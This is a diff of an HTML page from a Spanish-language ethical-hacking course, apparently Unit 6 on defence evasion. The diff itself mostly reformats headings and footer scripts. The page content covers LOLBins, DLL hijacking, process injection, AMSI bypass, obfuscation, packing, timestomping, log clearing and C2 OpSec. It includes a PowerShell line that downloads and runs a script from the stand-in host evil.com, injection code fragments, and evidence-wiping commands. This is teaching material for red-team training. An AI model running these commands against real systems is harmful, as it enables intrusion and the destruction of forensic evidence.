+  <li><a href="#unidad-6-evasión-de-defensas" id="toc-unidad-6-evasión-de-defensas" class="nav-link active" data-scroll-target="#unidad-6-evasión-de-defensas">🛡️ Unidad 6: Evasión de Defensas</a>
   <ul class="collapse">
-  <li><a href="#objetivos-de-aprendizaje" id="toc-objetivos-de-aprendizaje" class="nav-link" data-scroll-target="#objetivos-de-aprendizaje"><span class="header-section-number">8.1</span> 🎯 Objetivos de Aprendizaje</a></li>
-  <li><a href="#contenido-teórico" id="toc-contenido-teórico" class="nav-link" data-scroll-target="#contenido-teórico"><span class="header-section-number">8.2</span> 📚 Contenido Teórico</a>
+  <li><a href="#objetivos-de-aprendizaje" id="toc-objetivos-de-aprendizaje" class="nav-link" data-scroll-target="#objetivos-de-aprendizaje">🎯 Objetivos de Aprendizaje</a></li>
+  <li><a href="#contenido-teórico" id="toc-contenido-teórico" class="nav-link" data-scroll-target="#contenido-teórico">📚 Contenido Teórico</a>
   <ul class="collapse">
-  <li><a href="#edr-evasion" id="toc-edr-evasion" class="nav-link" data-scroll-target="#edr-evasion"><span class="header-section-number">8.2.1</span> 🔓 6.1 EDR Evasion</a></li>
-  <li><a href="#antivirus-bypass" id="toc-antivirus-bypass" class="nav-link" data-scroll-target="#antivirus-bypass"><span class="header-section-number">8.2.2</span> 🔬 6.2 Antivirus Bypass</a></li>
-  <li><a href="#antiforense" id="toc-antiforense" class="nav-link" data-scroll-target="#antiforense"><span class="header-section-number">8.2.3</span> 🕵️ 6.3 Antiforense</a></li>
-  <li><a href="#opsec" id="toc-opsec" class="nav-link" data-scroll-target="#opsec"><span class="header-section-number">8.2.4</span> 🔒 6.4 OpSec</a></li>
+  <li><a href="#edr-evasion" id="toc-edr-evasion" class="nav-link" data-scroll-target="#edr-evasion">🔓 6.1 EDR Evasion</a></li>
+  <li><a href="#antivirus-bypass" id="toc-antivirus-bypass" class="nav-link" data-scroll-target="#antivirus-bypass">🔬 6.2 Antivirus Bypass</a></li>
+  <li><a href="#antiforense" id="toc-antiforense" class="nav-link" data-scroll-target="#antiforense">🕵️ 6.3 Antiforense</a></li>
+  <li><a href="#opsec" id="toc-opsec" class="nav-link" data-scroll-target="#opsec">🔒 6.4 OpSec</a></li>
   </ul></li>
-  <li><a href="#herramientas" id="toc-herramientas" class="nav-link" data-scroll-target="#herramientas"><span class="header-section-number">8.3</span> 🛠️ Herramientas</a></li>
-  <li><a href="#laboratorio" id="toc-laboratorio" class="nav-link" data-scroll-target="#laboratorio"><span class="header-section-number">8.4</span> 🔬 Laboratorio</a></li>
-  <li><a href="#recursos-adicionales" id="toc-recursos-adicionales" class="nav-link" data-scroll-target="#recursos-adicionales"><span class="header-section-number">8.5</span> 📚 Recursos Adicionales</a></li>
-  <li><a href="#bibliografía" id="toc-bibliografía" class="nav-link" data-scroll-target="#bibliografía"><span class="header-section-number">8.6</span> 📖 Bibliografía</a></li>
+  <li><a href="#herramientas" id="toc-herramientas" class="nav-link" data-scroll-target="#herramientas">🛠️ Herramientas</a></li>
+  <li><a href="#laboratorio" id="toc-laboratorio" class="nav-link" data-scroll-target="#laboratorio">🔬 Laboratorio</a></li>
+  <li><a href="#recursos-adicionales" id="toc-recursos-adicionales" class="nav-link" data-scroll-target="#recursos-adicionales">📚 Recursos Adicionales</a></li>
+  <li><a href="#bibliografía" id="toc-bibliografía" class="nav-link" data-scroll-target="#bibliografía">📖 Bibliografía</a></li>
   </ul></li>
   </ul>
 </nav>
@@ -394,9 +584,10 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <!-- main -->
 <main class="content" id="quarto-document-content">
 
-<header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../contenido/unidad1.html">Contenido</a></li><li class="breadcrumb-item"><a href="../contenido/unidad6.html"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a></li></ol></nav>
+
+<header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../contenido/unidad1.html">Contenido</a></li><li class="breadcrumb-item"><a href="../contenido/unidad6.html"><span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a></li></ol></nav>
 <div class="quarto-title">
-<div class="quarto-title-block"><div><h1 class="title"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
+<div class="quarto-title-block"><div><h1 class="title"><span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
 </div>
 
 
@@ -413,10 +604,10 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </header>
 
 
-<section id="unidad-6-evasión-de-defensas" class="level1" data-number="8">
-<h1 data-number="8"><span class="header-section-number">8</span> 🛡️ Unidad 6: Evasión de Defensas</h1>
-<section id="objetivos-de-aprendizaje" class="level2" data-number="8.1">
-<h2 data-number="8.1" class="anchored" data-anchor-id="objetivos-de-aprendizaje"><span class="header-section-number">8.1</span> 🎯 Objetivos de Aprendizaje</h2>
+<section id="unidad-6-evasión-de-defensas" class="level1">
+<h1>🛡️ Unidad 6: Evasión de Defensas</h1>
+<section id="objetivos-de-aprendizaje" class="level2">
+<h2 class="anchored" data-anchor-id="objetivos-de-aprendizaje">🎯 Objetivos de Aprendizaje</h2>
 <ul>
 <li><strong>Bypassear</strong> soluciones EDR y antivirus.</li>
 <li><strong>Ejecutar</strong> técnicas de ocultación y process injection.</li>
@@ -425,13 +616,13 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </ul>
 <hr>
 </section>
-<section id="contenido-teórico" class="level2" data-number="8.2">
-<h2 data-number="8.2" class="anchored" data-anchor-id="contenido-teórico"><span class="header-section-number">8.2</span> 📚 Contenido Teórico</h2>
-<section id="edr-evasion" class="level3" data-number="8.2.1">
-<h3 data-number="8.2.1" class="anchored" data-anchor-id="edr-evasion"><span class="header-section-number">8.2.1</span> 🔓 6.1 EDR Evasion</h3>
+<section id="contenido-teórico" class="level2">
+<h2 class="anchored" data-anchor-id="contenido-teórico">📚 Contenido Teórico</h2>
+<section id="edr-evasion" class="level3">
+<h3 class="anchored" data-anchor-id="edr-evasion">🔓 6.1 EDR Evasion</h3>
 <p>Los Endpoint Detection and Response (EDR) monitorizan actividad en endpoints para detectar amenazas. El bypass requiere técnicas especializadas.</p>
-<section id="living-off-the-land-binaries-lolbins" class="level4" data-number="8.2.1.1">
-<h4 data-number="8.2.1.1" class="anchored" data-anchor-id="living-off-the-land-binaries-lolbins"><span class="header-section-number">8.2.1.1</span> 💻 Living Off the Land Binaries (LOLBins)</h4>
+<section id="living-off-the-land-binaries-lolbins" class="level4">
+<h4 class="anchored" data-anchor-id="living-off-the-land-binaries-lolbins">💻 Living Off the Land Binaries (LOLBins)</h4>
 <p>Utilizar binarios legítimos del sistema para ejecutar acciones maliciosas.</p>
 <p><strong>Ejemplos comunes</strong>:</p>
 <table class="caption-top table">
@@ -495,8 +686,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Con powershell</span></span>
 <span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">IEX</span> <span class="er">(</span><span class="ex">New-Object</span> Net.WebClient<span class="kw">)</span><span class="ex">.DownloadString</span><span class="er">(</span><span class="st">'http://evil.com/script.ps1'</span><span class="kw">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="dll-hijacking" class="level4" data-number="8.2.1.2">
-<h4 data-number="8.2.1.2" class="anchored" data-anchor-id="dll-hijacking"><span class="header-section-number">8.2.1.2</span> 🦴 DLL Hijacking</h4>
+<section id="dll-hijacking" class="level4">
+<h4 class="anchored" data-anchor-id="dll-hijacking">🦴 DLL Hijacking</h4>
 <p>Vulnerabilidad cuando una aplicación busca DLLs en ubicaciones inseguras.</p>
 <p><strong>Técnica</strong>: 1. Identificar DLLs que la app busca 2. Crear DLL maliciosa con mismo nombre 3. Colocar en directorio de la app o PATH</p>
 <p><strong>Detección</strong>:</p>
@@ -515,8 +706,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> TRUE<span class="op">;</span></span>
 <span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="process-injection" class="level4" data-number="8.2.1.3">
-<h4 data-number="8.2.1.3" class="anchored" data-anchor-id="process-injection"><span class="header-section-number">8.2.1.3</span> 💉 Process Injection</h4>
+<section id="process-injection" class="level4">
+<h4 class="anchored" data-anchor-id="process-injection">💉 Process Injection</h4>
 <p>Inyectar código en procesos legítimos del sistema.</p>
 <p><strong>DLL Injection</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Abrir proceso</span></span>
@@ -545,8 +736,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="co">// Resumir hilo</span></span>
 <span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>ResumeThread<span class="op">(</span>threadHandle<span class="op">);</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="amsi-bypass" class="level4" data-number="8.2.1.4">
-<h4 data-number="8.2.1.4" class="anchored" data-anchor-id="amsi-bypass"><span class="header-section-number">8.2.1.4</span> 🚫 AMSI Bypass</h4>
+<section id="amsi-bypass" class="level4">
+<h4 class="anchored" data-anchor-id="amsi-bypass">🚫 AMSI Bypass</h4>
 <p>Antimalware Scan Interface (AMSI) es una interfaz de Windows que permite a antivirus escanear en memoria.</p>
 <p><strong>Técnicas de bypass</strong>:</p>
 <p><strong>1. Patch de memoria</strong>:</p>
@@ -563,10 +754,10 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <hr>
 </section>
 </section>
-<section id="antivirus-bypass" class="level3" data-number="8.2.2">
-<h3 data-number="8.2.2" class="anchored" data-anchor-id="antivirus-bypass"><span class="header-section-number">8.2.2</span> 🔬 6.2 Antivirus Bypass</h3>
-<section id="obfuscation" class="level4" data-number="8.2.2.1">
-<h4 data-number="8.2.2.1" class="anchored" data-anchor-id="obfuscation"><span class="header-section-number">8.2.2.1</span> 🎭 Obfuscation</h4>
+<section id="antivirus-bypass" class="level3">
+<h3 class="anchored" data-anchor-id="antivirus-bypass">🔬 6.2 Antivirus Bypass</h3>
+<section id="obfuscation" class="level4">
+<h4 class="anchored" data-anchor-id="obfuscation">🎭 Obfuscation</h4>
 <p><strong>PowerShell obfuscation</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Concatenación</span></span>
 <span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="st">"Power"</span> <span class="op">+</span> <span class="st">"Shell"</span></span>
@@ -589,8 +780,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Usar</span></span>
 <span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>Invoke-Obfuscation</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="encryption" class="level4" data-number="8.2.2.2">
-<h4 data-number="8.2.2.2" class="anchored" data-anchor-id="encryption"><span class="header-section-number">8.2.2.2</span> 🔐 Encryption</h4>
+<section id="encryption" class="level4">
+<h4 class="anchored" data-anchor-id="encryption">🔐 Encryption</h4>
 <p><strong>AES Encryption</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> Crypto.Cipher <span class="im">import</span> AES</span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> base64</span>
@@ -604,8 +795,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>cipher <span class="op">=</span> arc4 ARC4(key)</span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>encrypted <span class="op">=</span> cipher.encrypt(shellcode)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="packers" class="level4" data-number="8.2.2.3">
-<h4 data-number="8.2.2.3" class="anchored" data-anchor-id="packers"><span class="header-section-number">8.2.2.3</span> 📦 Packers</h4>
+<section id="packers" class="level4">
+<h4 class="anchored" data-anchor-id="packers">📦 Packers</h4>
 <p>Comprimen y ofuscan ejecutables.</p>
 <p><strong>UPX</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">upx</span> <span class="at">-9</span> <span class="at">-o</span> payload_packed.exe payload.exe</span>
@@ -614,10 +805,10 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <hr>
 </section>
 </section>
-<section id="antiforense" class="level3" data-number="8.2.3">
-<h3 data-number="8.2.3" class="anchored" data-anchor-id="antiforense"><span class="header-section-number">8.2.3</span> 🕵️ 6.3 Antiforense</h3>
-<section id="timestomping" class="level4" data-number="8.2.3.1">
-<h4 data-number="8.2.3.1" class="anchored" data-anchor-id="timestomping"><span class="header-section-number">8.2.3.1</span> ⏰ Timestomping</h4>
+<section id="antiforense" class="level3">
+<h3 class="anchored" data-anchor-id="antiforense">🕵️ 6.3 Antiforense</h3>
+<section id="timestomping" class="level4">
+<h4 class="anchored" data-anchor-id="timestomping">⏰ Timestomping</h4>
 <p>Modificar timestamps de archivos para evadir detección forense.</p>
 <p><strong>Con Metasploit</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co"># post/windows/gather/timestomp</span></span>
@@ -633,8 +824,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Modificar última escritura</span></span>
 <span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">Get-Item</span> file<span class="op">.</span><span class="fu">exe</span><span class="op">).</span><span class="fu">LastWriteTime</span> <span class="op">=</span> <span class="st">"01/01/2020 00:00:00"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="artifact-wiping" class="level4" data-number="8.2.3.2">
-<h4 data-number="8.2.3.2" class="anchored" data-anchor-id="artifact-wiping"><span class="header-section-number">8.2.3.2</span> 🧹 Artifact Wiping</h4>
+<section id="artifact-wiping" class="level4">
+<h4 class="anchored" data-anchor-id="artifact-wiping">🧹 Artifact Wiping</h4>
 <p>Eliminar evidencia del sistema.</p>
 <p><strong>Limpiar event logs</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Clear todos los logs</span></span>
@@ -651,18 +842,18 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Linux</span></span>
 <span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-rf</span> /tmp/<span class="pp">*</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="memory-forensics-evasion" class="level4" data-number="8.2.3.3">
-<h4 data-number="8.2.3.3" class="anchored" data-anchor-id="memory-forensics-evasion"><span class="header-section-number">8.2.3.3</span> 🧠 Memory Forensics Evasion</h4>
+<section id="memory-forensics-evasion" class="level4">
+<h4 class="anchored" data-anchor-id="memory-forensics-evasion">🧠 Memory Forensics Evasion</h4>
 <p><strong>Evitar Volatility</strong>: - Evitar archivos en disco - Usar encryptión en memoria - No usar APIs estándar</p>
 <p><strong>No disk artifacts</strong>: - Ejecutar solo en memoria (fileless) - Usar WMI para ejecutar - Regsvr32 para DLLs</p>
 <hr>
 </section>
 </section>
-<section id="opsec" class="level3" data-number="8.2.4">
-<h3 data-number="8.2.4" class="anchored" data-anchor-id="opsec"><span class="header-section-number">8.2.4</span> 🔒 6.4 OpSec</h3>
+<section id="opsec" class="level3">
+<h3 class="anchored" data-anchor-id="opsec">🔒 6.4 OpSec</h3>
 <p>Operational Security protege la identidad y operaciones del Red Team.</p>
-<section id="principios-de-opsec" class="level4" data-number="8.2.4.1">
-<h4 data-number="8.2.4.1" class="anchored" data-anchor-id="principios-de-opsec"><span class="header-section-number">8.2.4.1</span> 📋 Principios de OpSec</h4>
+<section id="principios-de-opsec" class="level4">
+<h4 class="anchored" data-anchor-id="principios-de-opsec">📋 Principios de OpSec</h4>
 <ol type="1">
 <li><strong>Segregar identidades</strong>: Separar identidades de operación de identidades personales</li>
 <li><strong>Minimizar footprints</strong>: Dejar la menor evidencia posible</li>
@@ -670,8 +861,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <li><strong>No confiar en defensores</strong>: Asumir que pueden detectarte</li>
 </ol>
 </section>
-<section id="c2-communications" class="level4" data-number="8.2.4.2">
-<h4 data-number="8.2.4.2" class="anchored" data-anchor-id="c2-communications"><span class="header-section-number">8.2.4.2</span> 📡 C2 Communications</h4>
+<section id="c2-communications" class="level4">
+<h4 class="anchored" data-anchor-id="c2-communications">📡 C2 Communications</h4>
 <p><strong>Protección de tráfico</strong>: - Usar HTTPS con certificados legítimos - Domain fronting - Proxy chains</p>
 <p><strong>Domain Fronting</strong>:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejemplo con Cloudflare</span></span>
@@ -683,15 +874,15 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>    Sleep<span class="op">(</span>random<span class="op">(</span><span class="dv">1000</span><span class="op">,</span> <span class="dv">5000</span><span class="op">));</span></span>
 <span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="covering-tracks" class="level4" data-number="8.2.4.3">
-<h4 data-number="8.2.4.3" class="anchored" data-anchor-id="covering-tracks"><span class="header-section-number">8.2.4.3</span> 👣 Covering Tracks</h4>
+<section id="covering-tracks" class="level4">
+<h4 class="anchored" data-anchor-id="covering-tracks">👣 Covering Tracks</h4>
 <p><strong>Después de cada operación</strong>: 1. Eliminar herramientas usadas 2. Limpiar logs 3. Restaurar timestamps 4. Verificar que no quedó evidencia</p>
 <hr>
 </section>
 </section>
 </section>
-<section id="herramientas" class="level2" data-number="8.3">
-<h2 data-number="8.3" class="anchored" data-anchor-id="herramientas"><span class="header-section-number">8.3</span> 🛠️ Herramientas</h2>
+<section id="herramientas" class="level2">
+<h2 class="anchored" data-anchor-id="herramientas">🛠️ Herramientas</h2>
 <table class="caption-top table">
 <colgroup>
 <col style="width: 35%">
@@ -750,8 +941,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </table>
 <hr>
 </section>
-<section id="laboratorio" class="level2" data-number="8.4">
-<h2 data-number="8.4" class="anchored" data-anchor-id="laboratorio"><span class="header-section-number">8.4</span> 🔬 Laboratorio</h2>
+<section id="laboratorio" class="level2">
+<h2 class="anchored" data-anchor-id="laboratorio">🔬 Laboratorio</h2>
 <blockquote class="blockquote">
 <p>Ver <a href="../labs/lab-unidad6.html"><code>labs/lab-unidad6.md</code></a> para el escenario completo.</p>
 </blockquote>
@@ -759,8 +950,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <p><strong>Entregable</strong>: Payload + análisis de detección antes/después.</p>
 <hr>
 </section>
-<section id="recursos-adicionales" class="level2" data-number="8.5">
-<h2 data-number="8.5" class="anchored" data-anchor-id="recursos-adicionales"><span class="header-section-number">8.5</span> 📚 Recursos Adicionales</h2>
+<section id="recursos-adicionales" class="level2">
+<h2 class="anchored" data-anchor-id="recursos-adicionales">📚 Recursos Adicionales</h2>
 <ul>
 <li><a href="https://lolbas-project.github.io/">LOLBAS Project</a> — catálogo exhaustivo de binarios, scripts y librerías legítimas de Windows abusables por atacantes</li>
 <li><a href="https://amsi.fail/">AMSI.fail</a> — generador de bypasses AMSI ofuscados, útil para comprobar la robustez de detección en entornos Windows</li>
@@ -771,8 +962,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </ul>
 <hr>
 </section>
-<section id="bibliografía" class="level2" data-number="8.6">
-<h2 data-number="8.6" class="anchored" data-anchor-id="bibliografía"><span class="header-section-number">8.6</span> 📖 Bibliografía</h2>
+<section id="bibliografía" class="level2">
+<h2 class="anchored" data-anchor-id="bibliografía">📖 Bibliografía</h2>
 <ul>
 <li><a href="https://lolbas-project.github.io/">LOLBAS Project</a></li>
 <li><a href="https://amsi.fail/">AMSI.fail</a></li>
@@ -790,28 +981,21 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </section>
 
 </main> <!-- /main -->
-<!-- Sistema de Progreso -->
-<script src="assets/js/progress.js"></script>
-
-<!-- Navegación Móvil -->
-<script src="assets/js/mobile-nav.js"></script>
-
-<!-- Inicialización de componentes UX -->
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Inicializar sistema de progreso
-    if (window.CourseProgress) {
-        console.log('Sistema de progreso inicializado');
-    }
-    
-    // Inicializar navegación móvil
-    if (window.MobileNav) {
-        console.log('Navegación móvil inicializada');
-    }
-});
-</script>
 <script id="quarto-html-after-body" type="application/javascript">
   window.document.addEventListener("DOMContentLoaded", function (event) {
+    // Ensure there is a toggle, if there isn't float one in the top right
+    if (window.document.querySelector('.quarto-color-scheme-toggle') === null) {
+      const a = window.document.createElement('a');
+      a.classList.add('top-right');
+      a.classList.add('quarto-color-scheme-toggle');
+      a.href = "";
+      a.onclick = function() { try { window.quartoToggleColorScheme(); } catch {} return false; };
+      const i = window.document.createElement("i");
+      i.classList.add('bi');
+      a.appendChild(i);
+      window.document.body.appendChild(a);
+    }
+    setColorSchemeToggle(hasAlternateSentinel())
     const icon = "";
     const anchorJS = new window.AnchorJS();
     anchorJS.options = {
@@ -934,7 +1118,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
       var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
       var mailtoRegex = new RegExp(/^mailto:/);
-        var filterRegex = new RegExp("https:\/\/statick88\.github\.io\/ethical-hacking-2026\/");
+        var filterRegex = new RegExp('/' + window.location.host + '/');
       var isInternal = (href) => {
           return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
       }
@@ -948,6 +1132,13 @@ document.addEventListener('DOMContentLoaded', function() {
           if (link.dataset.originalHref !== undefined) {
             link.href = link.dataset.originalHref;
           }
+            // target, if specified
+            link.setAttribute("target", "_blank");
+            if (link.getAttribute("rel") === null) {
+              link.setAttribute("rel", "noopener");
+            }
+            // default icon
+            link.classList.add("external");
         }
       }
     function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
@@ -1264,12 +1455,12 @@ document.addEventListener('DOMContentLoaded', function() {
 <nav class="page-navigation">
   <div class="nav-page nav-page-previous">
       <a href="../contenido/unidad5.html" class="pagination-link" aria-label="🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico">
-        <i class="bi bi-arrow-left-short"></i> <span class="nav-page-text"><span class="chapter-number">6</span>&nbsp; <span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></span>
+        <i class="bi bi-arrow-left-short"></i> <span class="nav-page-text"><span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></span>
       </a>          
   </div>
   <div class="nav-page nav-page-next">
       <a href="../contenido/unidad7.html" class="pagination-link" aria-label="🏭 Unidad 7: Ciberseguridad Industrial">
-        <span class="nav-page-text"><span class="chapter-number">8</span>&nbsp; <span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></span> <i class="bi bi-arrow-right-short"></i>
+        <span class="nav-page-text"><span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></span> <i class="bi bi-arrow-right-short"></i>
       </a>
   </div>
 </nav><div class="modal fade" id="quarto-embedded-source-code-modal" tabindex="-1" aria-labelledby="quarto-embedded-source-code-modal-label" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="quarto-embedded-source-code-modal-label">Source Code</h5><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div class="">
@@ -1643,6 +1834,30 @@ document.addEventListener('DOMContentLoaded', function() {
 <span id="cb20-368"><a href="#cb20-368" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Red Team OPSEC</span><span class="co">](https://blog.zsec.uk/opsec-for-red-team-part-1/)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button" data-in-quarto-modal=""><i class="bi"></i></button></div>
 </div></div></div></div></div>
 </div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+    <a class="nav-link active" href="../about.html" aria-current="page">
+<p>About</p>
+</a>
+  </li>  
+    <li class="nav-item">
+    <a class="nav-link" href="../license.html">
+<p>License</p>
+</a>
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      &nbsp;
+    </div>
+  </div>
+</footer>
 
 
 
